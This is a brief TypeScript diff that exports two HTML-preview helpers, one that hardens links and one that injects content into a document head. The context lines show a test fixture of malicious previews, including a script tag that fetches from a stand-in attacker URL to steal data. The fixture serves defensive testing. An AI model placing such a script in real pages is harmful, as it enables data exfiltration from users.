@@ -29,7 +29,7 @@ export const MALICIOUS_PREVIEW_FIXTURES = {
   externalFetch: '<script>fetch("https://evil.example/steal")</script>',
 } as const;
 
-function hardenLinks(html: string): string {
+export function hardenLinks(html: string): string {
   return html.replace(/<a\b([^>]*)>/gi, (_match, attrs: string) => {
     let next = attrs;
     if (!/\btarget\s*=/.test(next)) next += ' target="_blank"';
@@ -38,7 +38,7 @@ function hardenLinks(html: string): string {
   });
 }
 
-function injectIntoDocument(html: string, injection: string): string {
+export function injectIntoDocument(html: string, injection: string): string {
   if (/<head[\s>]/i.test(html)) {
     return html.replace(/<head(\s[^>]*)?>/i, (head) => `${head}\n${injection}`);
   }
